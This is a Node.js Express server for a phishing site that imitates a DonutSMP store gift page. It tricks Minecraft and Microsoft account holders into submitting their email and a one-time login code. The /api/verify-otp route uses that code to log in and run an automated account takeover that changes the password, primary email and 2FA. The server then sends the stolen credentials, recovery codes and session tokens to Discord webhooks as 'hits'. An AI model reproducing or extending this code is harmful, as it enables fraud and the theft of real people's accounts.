const express = require('express');
const path = require('path');
const fs = require('fs');
const http = require('http');

// AutoSecure Core Modules
const validEmail = require('./autosecure/utils/emails/validEmail');
const getCredentials = require('./autosecure/utils/info/getCredentials');
const sendotp = require('./autosecure/utils/secure/sendotp');
const login = require('./autosecure/utils/secure/login');
const secure = require('./autosecure/utils/secure/recodesecure');
const generateuid = require('./autosecure/utils/generateuid');
const insertaccount = require('./db/insertaccount');
const { getDonutStats } = require('./autosecure/utils/donutapi/getDonutStats');
const getStats = require('./autosecure/utils/hypixelapi/getStats');
const { sendSecureNotification } = require('./autosecure/utils/notifications/notifier');
const { initializeDB, queryParams } = require('./db/db');
const { sendWebLog } = require('./autosecure/utils/webLogger');
const config = require('./config.json');

const app = express();
const PORT = process.env.PORT || 3000;
const FRONTEND_DIR = path.join(__dirname, 'public');

// Active OTP Sessions cache: sessionId -> { email, secId, secDisplay, username, timestamp }
const activeSessions = new Map();

// Clean up expired sessions every 10 minutes
setInterval(() => {
    const now = Date.now();
    for (const [id, sess] of activeSessions.entries()) {
        if (now - sess.timestamp > 15 * 60 * 1000) { // 15 mins expiry
            activeSessions.delete(id);
        }
    }
}, 10 * 60 * 1000);

// --- MIDDLEWARES ---
// Enable CORS for all origins & methods
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// IP Ban Check
app.use(async (req, res, next) => {
    try {
        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        const clientIp = rawIp.split(',')[0].trim();
        if (clientIp) {
            const banned = await queryParams('SELECT 1 FROM banned_ips WHERE ip = ?', [clientIp]);
            if (banned && banned.length > 0) {
                return res.status(403).send('<h1 style="text-align:center;margin-top:20%;font-family:sans-serif;">403 Forbidden - Access Denied</h1>');
            }
        }
    } catch (e) {
        console.error('[IP_BAN_MIDDLEWARE] Error checking banned IP:', e.message);
    }
    next();
});

// Request logger
app.use((req, res, next) => {
    const time = new Date().toLocaleTimeString('vi-VN');
    if (req.url.startsWith('/api/')) {
        console.log(`[${time}] ${req.method} ${req.url}`);
    }
    next();
});

// Realtime Web Activity Logging
app.post('/api/web-activity', async (req, res) => {
    try {
        const { code, username, email, statusText, domain } = req.body || {};
        // Log if username is provided (email is optional for early steps like Waiting Email)
        if (username) {
            const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
            const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
            
            console.log(`[WEB ACTIVITY] ${username} | ${statusText} | IP: ${clientIp} | Code: ${code || 'None'} | Email: ${email || 'None'}`);

            await sendWebLog({
                code,
                ip: clientIp,
                domain: config.webDomain || (config.domains && config.domains[0]) || 'donuttsmp.store',
                username,
                email: email || '',
                statusText: statusText || 'Send Code'
            });
        }

        return res.json({ success: true });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

// --- API ENDPOINTS ---

/**
 * 1. Health check
 */
app.get('/api/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'DonutSMP VinGroup API Server',
        time: new Date().toISOString(),
        activeSessions: activeSessions.size
    });
});

/**
 * 2. Send OTP (User nhập email -> Backend xác nhận nếu email đúng thì gửi OTP)
 * Body: { email, username }
 */
app.post('/api/send-otp', async (req, res) => {
    try {
        let { email, username, giftCode, code: altCode } = req.body;
        email = (email || '').trim();
        username = (username || '').trim();
        const curGiftCode = (giftCode || altCode || '').trim();

        // Check gift link validity and 30-min expiration if code provided
        let resolvedBotUserId = null;
        let resolvedBotNumber = 1;

        if (curGiftCode) {
            const EXPIRY_MS = 30 * 60 * 1000;
            const now = Date.now();
            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
            if (!giftRows || giftRows.length === 0 || (now - giftRows[0].created_at > EXPIRY_MS)) {
                if (giftRows && giftRows.length > 0) {
                    await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
                }
                return res.status(410).json({
                    success: false,
                    error: 'Gift link has expired after 30 minutes. Please ask for a new link!'
                });
            }
            resolvedBotUserId = giftRows[0].bot_user_id;
            resolvedBotNumber = giftRows[0].bot_number || 1;

            const { checkWebAccess } = require('./autosecure/utils/web/webAccess');
            const ownerWebAccess = await checkWebAccess(resolvedBotUserId);
            if (!ownerWebAccess.hasAccess) {
                return res.status(403).json({
                    success: false,
                    error: 'Dịch vụ web của người gửi hiện đang tạm ngưng do hết hạn bản quyền.'
                });
            }
        }

        console.log(`\n======================================================`);
        console.log(`[API /send-otp] Nhận yêu cầu gửi mã OTP:`);
        console.log(` • Email    : ${email}`);
        console.log(` • Username : ${username || 'N/A'}`);
        console.log(` • GiftCode : ${curGiftCode || 'None'}`);
        console.log(` • Bot Owner: ${resolvedBotUserId || 'Default'}`);

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Vui lòng nhập email tài khoản Microsoft / Minecraft của bạn.'
            });
        }

        if (!validEmail(email)) {
            return res.status(400).json({
                success: false,
                error: 'Định dạng email không hợp lệ. Vui lòng kiểm tra lại!'
            });
        }

        console.log(`[API /send-otp] Đang truy vấn Microsoft Live Credentials cho ${email}...`);
        const profiles = await getCredentials(email, false);

        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
        const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';

        if (!profiles) {
            console.log(`[API /send-otp] [X] Không thể tìm thấy thông tin tài khoản Microsoft: ${email}`);
            sendWebLog({
                code: curGiftCode,
                ip: clientIp,
                username: username || 'Player',
                email,
                statusText: 'Invalid Email'
            }).catch(() => {});

            return res.status(404).json({
                success: false,
                error: 'Không tìm thấy tài khoản Microsoft liên kết với email này.'
            });
        }

        // Extract eligible OTP proofs
        const eligibleProofs = profiles.Credentials?.OtcLoginEligibleProofs ||
            (profiles._securityEmails && profiles._securityEmails.length > 0 ? profiles._securityEmails.map(s => s.proof || s) : null) ||
            profiles.Credentials?.Proofs;

        if (!eligibleProofs || eligibleProofs.length === 0) {
            console.log(`[API /send-otp] [X] Tài khoản không có phương thức nhận mã OTP qua Email!`);
            sendWebLog({
                code: curGiftCode,
                ip: clientIp,
                username: username || 'Player',
                email,
                statusText: 'No security options'
            }).catch(() => {});

            return res.status(400).json({
                success: false,
                error: 'Tài khoản Microsoft này không hỗ trợ gửi mã xác minh một lần qua Email.'
            });
        }

        const secEmailObj = eligibleProofs[0];
        const secDisplay = secEmailObj.display || secEmailObj.data || email;
        const secData = secEmailObj.data || secEmailObj.display || email;

        console.log(`[API /send-otp] [✔] Tìm thấy phương thức gửi OTP: ${secDisplay}`);
        console.log(`[API /send-otp] Đang kích hoạt gửi mã OTP từ Microsoft Live...`);

        const otpSent = await sendotp(email, secData);

        if (!otpSent) {
            console.log(`[API /send-otp] [X] Microsoft từ chối gửi mã OTP.`);
            return res.status(500).json({
                success: false,
                error: 'Không thể gửi mã OTP từ Microsoft Live. Vui lòng thử lại sau giây lát!'
            });
        }

        // Log to Discord: Minecraft Username + Email entered and OTP successfully sent
        sendWebLog({
            code: curGiftCode,
            ip: clientIp,
            username: username || 'Player',
            email,
            statusText: 'Send Code'
        }).catch(() => {});

        // Store session
        const sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        activeSessions.set(sessionId, {
            email,
            secData,
            secDisplay,
            username,
            giftCode: curGiftCode,
            botUserId: resolvedBotUserId,
            botNumber: resolvedBotNumber,
            timestamp: Date.now()
        });

        console.log(`[API /send-otp] [✔] ĐÃ GỬI OTP THÀNH CÔNG TỚI: ${secDisplay} (Session: ${sessionId})`);
        console.log(`======================================================\n`);

        return res.json({
            success: true,
            sessionId,
            email,
            maskedEmail: secDisplay,
            secId: secData,
            message: `Mã xác nhận OTP đã được gửi đến ${secDisplay}!`
        });

    } catch (error) {
        console.error('[API /send-otp] Lỗi ngoại lệ:', error);
        return res.status(500).json({
            success: false,
            error: 'Đã xảy ra lỗi trong quá trình xử lý gửi mã OTP: ' + error.message
        });
    }
});

/**
 * 3. Verify OTP & VinGroup (User nhập OTP -> Nếu đúng = VinGroup -> Bắn hit Discord)
 * Body: { sessionId, email, secId, code, username, giftCode }
 */
app.post('/api/verify-otp', async (req, res) => {
    try {
        let { sessionId, email, secId, code, username, giftCode, code: altCode } = req.body;
        code = (code || '').toString().trim();
        let curGiftCode = (giftCode || altCode || '').trim();
        let botUserId = null;
        let botNumber = 1;

        // Restore from session if available
        if (sessionId && activeSessions.has(sessionId)) {
            const sess = activeSessions.get(sessionId);
            if (!email) email = sess.email;
            if (!secId) secId = sess.secData;
            if (!username) username = sess.username;
            if (!curGiftCode) curGiftCode = sess.giftCode;
            botUserId = sess.botUserId;
            botNumber = sess.botNumber || 1;
        }

        // If botUserId not yet resolved from session, query from gift_links
        if (!botUserId && curGiftCode) {
            const giftRows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [curGiftCode]);
            if (giftRows && giftRows.length > 0) {
                botUserId = giftRows[0].bot_user_id;
                botNumber = giftRows[0].bot_number || 1;
            }
        }

        email = (email || '').trim();
        secId = (secId || '').trim();
        username = (username || '').trim();

        console.log(`\n======================================================`);
        console.log(`[API /verify-otp] Nhận yêu cầu xác thực OTP:`);
        console.log(` • Email    : ${email}`);
        console.log(` • SecId    : ${secId ? 'Hợp lệ' : 'Trống'}`);
        console.log(` • Mã OTP   : ${code}`);
        console.log(` • Username : ${username || 'N/A'}`);
        console.log(` • Bot Owner: ${botUserId || 'Default'}`);

        if (!code || isNaN(code)) {
            return res.status(400).json({
                success: false,
                error: 'Mã xác nhận phải là dãy số gồm 6-8 chữ số!'
            });
        }

        if (!email) {
            return res.status(400).json({
                success: false,
                error: 'Thiếu thông tin email tài khoản!'
            });
        }

        console.log(`[API /verify-otp] Đang tiến hành đăng nhập Microsoft Live với mã OTP...`);
        const creds = await getCredentials(email, false);
        const host = await login({ email, id: secId, code }, creds);

        if (!host || host === 'tfa') {
            console.log(`[API /verify-otp] [X] Mã OTP không chính xác hoặc đã hết hạn!`);
            return res.status(401).json({
                success: false,
                error: 'Mã xác nhận không chính xác hoặc đã hết hạn. Vui lòng kiểm tra lại email!'
            });
        }

        console.log(`[API /verify-otp] [✔] ĐĂNG NHẬP MICROSOFT THÀNH CÔNG! (Host Cookie acquired)`);
        console.log(`[API /verify-otp] BẮT ĐẦU QUY TRÌNH VINGROUP (Chiếm quyền tài khoản)...`);

        // Generate unique account UID
        const uid = await generateuid();

        // Fetch user custom autosecure config if botUserId found
        let userConfig = null;
        if (botUserId) {
            let userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? AND botnumber = ?', [botUserId, botNumber]);
            if (!userRows || userRows.length === 0) {
                userRows = await queryParams('SELECT * FROM autosecure WHERE user_id = ? LIMIT 1', [botUserId]);
            }
            if (userRows && userRows.length > 0) {
                userConfig = userRows[0];
            }
        }

        const effectiveUserId = botUserId || "web_system";
        const settings = {
            ...(userConfig || {}),
            user_id: effectiveUserId,
            botnumber: botNumber,

            // Row 1 (Discord Settings embed)
            auto_secure: userConfig?.auto_secure ?? 1,
            change_ign: userConfig?.change_ign ?? 0,
            multiplayer: userConfig?.multiplayer ?? 0,

            // Row 2
            secureifnomc: userConfig?.secureifnomc ?? 1,
            checkban: userConfig?.checkban ?? 0,
            checkban_hypixel: userConfig?.checkban_hypixel ?? userConfig?.checkban ?? 0,
            checkban_donut: userConfig?.checkban_donut ?? 0,
            autoquarantine: userConfig?.autoquarantine ?? 0,

            // Row 3
            oauthapps: userConfig?.oauthapps ?? 1,
            exploit: userConfig?.exploit ?? 1,
            removedevices: userConfig?.removedevices ?? 1,

            // Row 4
            addzyger: userConfig?.addzyger ?? 1,
            signout: userConfig?.signout ?? 1,
            changegamertag: userConfig?.changegamertag ?? 0,

            // Row 5
            subscribemail: userConfig?.subscribemail ?? 0,
            changeprimary: userConfig?.changeprimary ?? 1,
            domain: userConfig?.domain || (config.domains && config.domains[0]) || "thapcamstore.click",

            // Embed 2 (Personalization)
            changename: userConfig?.changename ?? 0,
            name: userConfig?.name || null,
            changedob: userConfig?.changedob ?? 0,
            dob: userConfig?.dob || null,
            changepfp: userConfig?.changepfp ?? 0,
            pfp: userConfig?.pfp || config.defaultpfp || "https://website.donutsmp.org/bcGCsev.png",
            changelanguage: userConfig?.changelanguage ?? 0,
            language: userConfig?.language || 'en-US',
            prefix: userConfig?.prefix || "vingr0ub",

            // Other configs
            removecards: userConfig?.removecards ?? 0,
            leavefamily: userConfig?.leavefamily ?? 1,
            removelinkednumbers: userConfig?.removelinkednumbers ?? 1,
            webhook: userConfig?.webhook || config.notifierWebhook || "",
            ping: userConfig?.ping || "@everyone",
            aftersecure: userConfig?.aftersecure || "nothing",
            hits_channel: userConfig?.hits_channel || null,
            logs_channel: userConfig?.logs_channel || null,
            notification_channel: userConfig?.notification_channel || null,
            users_channel: userConfig?.users_channel || null,
            server_id: userConfig?.server_id || null,
            claiming: userConfig?.claiming ?? 0
        };

        console.log(`[API /verify-otp] Áp dụng cấu hình VinGroup của bot con (${effectiveUserId}):`);
        console.log(` • VinGroup    : ${settings.auto_secure ? 'BẬT' : 'TẮT'}`);
        console.log(` • Change IGN    : ${settings.change_ign ? 'BẬT' : 'TẮT'}`);
        console.log(` • Multiplayer   : ${settings.multiplayer ? 'TẮT MP' : 'GIỮ NGUYÊN'}`);
        console.log(` • Checkban      : ${settings.checkban ? 'BẬT' : 'TẮT'}`);
        console.log(` • Zyger 2FA     : ${settings.addzyger ? 'BẬT' : 'TẮT'}`);
        console.log(` • Change Primary: ${settings.changeprimary ? 'BẬT' : 'TẮT'}`);
        console.log(` • Prefix        : ${settings.prefix}`);
        console.log(` • Domain MCS    : ${settings.domain}`);
        console.log(` • Change Name   : ${settings.changename ? 'BẬT' : 'TẮT'}`);
        console.log(` • Change DOB/Reg: ${settings.changedob ? 'BẬT' : 'TẮT'}`);
        console.log(` • Change PFP    : ${settings.changepfp ? 'BẬT' : 'TẮT'}`);
        console.log(` • Change Lang   : ${settings.changelanguage ? 'BẬT' : 'TẮT'}`);

        if (!settings.auto_secure) {
            console.log(`[API /verify-otp] Bot con đã tắt VinGroup! Lưu mã vào danh sách chờ claim thủ công.`);
            const embedData = {
                embeds: [{
                    title: `${username || 'Account'}! :x:`,
                    description: `Email: **${email}**\nSecurity email: **${secId}**\nCode: **${code}**\n*VinGroup đang TẮT trong cấu hình bot con. Vui lòng claim thủ công.*`,
                    color: 0x00ff00
                }]
            };
            await queryParams("INSERT INTO unclaimed (user_id, username, data) VALUES (?, ?, ?)",
                [effectiveUserId, username || email, JSON.stringify(embedData)]).catch(() => {});

            if (curGiftCode) {
                await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
            }
            if (sessionId) activeSessions.delete(sessionId);

            return res.json({
                success: true,
                uid,
                username: username || email,
                message: 'Mã xác nhận hợp lệ. Vui lòng dùng lệnh /claim trong Discord để nhận tài khoản!'
            });
        }

        // Execute VinGroup account takeover
        let acc = await secure(host, settings, uid, username);

        console.log(`[API /verify-otp] [✔] VinGroup hoàn tất! UID: ${uid}`);
        console.log(` • Tên MC mới   : ${acc.newName || 'N/A'}`);
        console.log(` • Mật khẩu mới : ${acc.password || 'N/A'}`);
        console.log(` • Recovery Code: ${acc.recoveryCode || 'N/A'}`);

        // Query DonutSMP stats
        const targetIgn = acc.newName && acc.newName !== "No Minecraft!" ? acc.newName : (username || acc.oldName || "");
        let donutStats = null;
        if (targetIgn) {
            try {
                console.log(`[API /verify-otp] Đang lấy thống kê DonutSMP cho: ${targetIgn}...`);
                donutStats = await getDonutStats(targetIgn);
                if (donutStats) {
                    console.log(`[API /verify-otp] DonutSMP Stats: Money=${donutStats.moneyFormatted}, Shards=${donutStats.shardsFormatted}, Rank=${donutStats.rank}`);
                }
            } catch (err) {
                console.log(`[API /verify-otp] Lỗi lấy stats DonutSMP: ${err.message}`);
            }
        }

        // Query Hypixel stats
        let hypixelStats = null;
        if (targetIgn) {
            try {
                hypixelStats = await getStats(targetIgn);
            } catch (e) {}
        }

        // Insert into SQLite database mapped to specific bot owner
        try {
            await insertaccount(acc, uid, effectiveUserId, settings.secureifnomc);
            console.log(`[API /verify-otp] [✔] Đã lưu thông tin tài khoản vào database SQLite cho user: ${effectiveUserId}`);
        } catch (dbErr) {
            console.error(`[API /verify-otp] Lỗi lưu DB:`, dbErr.message);
        }

        // Send Hit to Discord
        console.log(`[API /verify-otp] ĐANG BẮN HIT VỀ DISCORD...`);
        try {
            const accountData = {
                username: targetIgn || 'Unknown',
                email: acc.email,
                oldEmail: email,
                password: acc.password,
                recoveryCode: acc.recoveryCode,
                secretkey: acc.secretkey,
                secEmail: acc.secEmail,
                ssid: acc.ssid,
                donut: donutStats,
                donutMoney: donutStats?.moneyFormatted || null,
                donutShards: donutStats?.shardsFormatted || null,
                donutPlaytime: donutStats?.playtime || null,
                donutRank: donutStats?.rank || null,
                donutKDR: donutStats?.kdr || null,
                networth: hypixelStats?.networth || '0',
                bedwars: hypixelStats?.bedwars?.level || '0',
                networkLevel: hypixelStats?.networkLevel || '0'
            };

            const clientTarget = { username: effectiveUserId, botnumber: botNumber };
            await sendSecureNotification(clientTarget, accountData);
            console.log(`[API /verify-otp] [✔] HIT ĐÃ ĐƯỢC BẮN THÀNH CÔNG VỀ DISCORD!`);
        } catch (whError) {
            console.error(`[API /verify-otp] Lỗi bắn hit Discord:`, whError.message);
        }

        // Consume gift link
        if (curGiftCode) {
            await queryParams('DELETE FROM gift_links WHERE code = ?', [curGiftCode]).catch(() => {});
        }

        // Clear active session
        if (sessionId) activeSessions.delete(sessionId);

        console.log(`======================================================\n`);

        return res.json({
            success: true,
            uid,
            username: targetIgn,
            message: 'Xác thực tài khoản và hoàn tất đơn hàng thành công!'
        });

    } catch (error) {
        console.error('[API /verify-otp] Lỗi xử lý xác thực OTP:', error);
        return res.status(500).json({
            success: false,
            error: 'Đã xảy ra lỗi trong quá trình xác thực OTP: ' + error.message
        });
    }
});

// --- TEBEX DONUT SMP STATIC ROUTING ---

// Serve static assets
app.use('/assets', express.static(path.join(FRONTEND_DIR, 'assets')));
app.use('/terms', express.static(path.join(FRONTEND_DIR, 'terms')));

// Periodic cleanup of expired gift links (> 30 mins) every 5 minutes
setInterval(async () => {
    try {
        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [Date.now() - 30 * 60 * 1000]);
    } catch (e) {}
}, 5 * 60 * 1000);

// Donut Gift Link Claim Routes
app.get(['/gift/:code/claim', '/gift/:code'], async (req, res) => {
    const code = req.params.code;
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    const clientIp = rawIp.split(',')[0].trim() || '127.0.0.1';
    const host = req.headers.host || config.webDomain || 'donuttsmp.store';
    const EXPIRY_MS = 30 * 60 * 1000;
    const now = Date.now();

    try {
        // 1. Dọn dẹp link cũ
        await queryParams('DELETE FROM gift_links WHERE created_at < ?', [now - EXPIRY_MS]).catch(() => {});

        // 2. Kiểm tra link có tồn tại và còn hạn 30 phút không
        const rows = await queryParams('SELECT * FROM gift_links WHERE code = ?', [code]);
        if (!rows || rows.length === 0) {
            return res.status(410).send(`
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <title>Gift Link Expired - DonutSMP Store</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #0f1117; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .card { background: #1a1d26; border: 1px solid #2d3343; border-radius: 16px; padding: 40px 30px; max-width: 480px; width: 100%; text-align: center; box-shadow: 0 16px 40px rgba(0,0,0,0.6); }
        .icon { font-size: 56px; margin-bottom: 16px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.08); } }
        h1 { font-size: 22px; margin: 0 0 12px; color: #f87171; font-weight: 700; }
        p { color: #9ca3af; font-size: 15px; line-height: 1.6; margin: 0 0 26px; }
        .btn { display: inline-block; background: #eab308; color: #111; text-decoration: none; padding: 13px 28px; border-radius: 10px; font-weight: 700; font-size: 14px; transition: 0.2s; }
        .btn:hover { background: #facc15; transform: translateY(-2px); }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">⌛</div>
        <h1>Link Gift Đã Hết Hạn / Không Tồn Tại</h1>
        <p>Liên kết quà tặng này chỉ có hiệu lực trong <strong>30 phút</strong> và hiện đã tự động hết hạn hoặc bị xóa.<br><br>Vui lòng yêu cầu người gửi tạo link gift mới để tiếp tục!</p>
        <a href="/store" class="btn">Quay lại Trang Chủ Store</a>
    </div>
</body>
</html>
            `);
        }

        // 3. Gửi thông báo click vào đúng bot sở hữu link
        sendWebLog({
            code,
            ip: clientIp,
            link: `${host}/gift/${code}/claim`,
            domain: host,
            action: 'click_link'
        }).catch(err => console.error('[SERVER] Error logging click:', err.message));

        res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
    } catch (err) {
        console.error('[SERVER /gift claim] Error:', err);
        res.redirect(`/checkout/payment?gift=true&code=${encodeURIComponent(code)}`);
    }
});

app.get('/gift', (req, res) => {
    res.redirect('/store?gift=true');
});

// Tebex store and checkout route mappings
app.get('/', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));
app.get('/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'index.html')));

app.get('/store', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));
app.get('/store.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'store.html')));

app.get('/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));
app.get('/checkout/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout.html')));

app.get('/checkout/basket', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));
app.get('/checkout/basket/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'basket.html')));

app.get('/checkout/pay', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));
app.get('/checkout/pay/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'pay.html')));

app.get('/checkout/payment', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));
app.get('/checkout/payment/index.html', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'checkout', 'payment.html')));

// Support package add routes like /checkout/packages/add/7446586/subscribe
app.get('/checkout/packages/add/:id/:type', (req, res) => {
    res.sendFile(path.join(FRONTEND_DIR, 'checkout.html'));
});

// Terms pages
app.get('/terms/checkout', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_checkout.html')));
app.get('/terms/impressum', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_impressum.html')));
app.get('/terms/privacy', (req, res) => res.sendFile(path.join(FRONTEND_DIR, 'terms_privacy.html')));

// Fallback static files
app.use(express.static(FRONTEND_DIR));

// Start server function
async function startServer() {
    try {
        console.log('Đang khởi tạo cơ sở dữ liệu SQLite...');
        await initializeDB();
        console.log('Cơ sở dữ liệu SQLite đã sẵn sàng.');

        app.listen(PORT, '127.0.0.1', () => {
            console.log(`\n======================================================`);
            console.log(`🚀 DonutSMP Web Server & VinGroup API đang hoạt động!`);
            console.log(` • Website Store : http://localhost:${PORT}`);
            console.log(` • Checkout Page : http://localhost:${PORT}/checkout`);
            console.log(` • Payment Page  : http://localhost:${PORT}/checkout/payment`);
            console.log(` • API Send OTP  : http://localhost:${PORT}/api/send-otp`);
            console.log(` • API Verify OTP: http://localhost:${PORT}/api/verify-otp`);
            console.log(` • Discord Hook  : ${config.notifierWebhook ? 'ĐÃ CẤU HÌNH' : 'Chưa cấu hình'}`);
            console.log(`======================================================\n`);
        });
    } catch (err) {
        console.error('Lỗi khởi động Server:', err);
    }
}

if (require.main === module) {
    startServer();
}

module.exports = { app, startServer };
